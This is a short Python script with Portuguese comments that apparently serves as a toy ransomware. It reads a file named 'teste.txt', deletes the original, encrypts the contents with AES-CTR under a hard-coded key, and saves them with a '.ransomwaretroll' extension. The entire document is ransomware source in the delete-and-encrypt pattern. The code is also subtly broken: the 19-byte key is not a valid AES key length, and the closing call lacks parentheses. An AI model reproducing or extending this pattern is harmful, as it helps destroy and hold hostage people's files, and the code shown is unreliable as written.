##importar bibliotecas

import os
import pyaes

## abrir arquivos que vão ser criptografados
file_name = "teste.txt"
file = open(file_name,"rb")
data = file.read()
file.close()

## remover o arquivo 
os.remove(file_name)

##criado uma chave de criptografia
key = b"testeDeCriptografia"
aes = pyaes.AESModeOfOperationCTR(key)

cripto_data = aes.encrypt(data)

#criado um novo arquivo criptografado
new_file = file_name+".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(cripto_data)
new_file.close

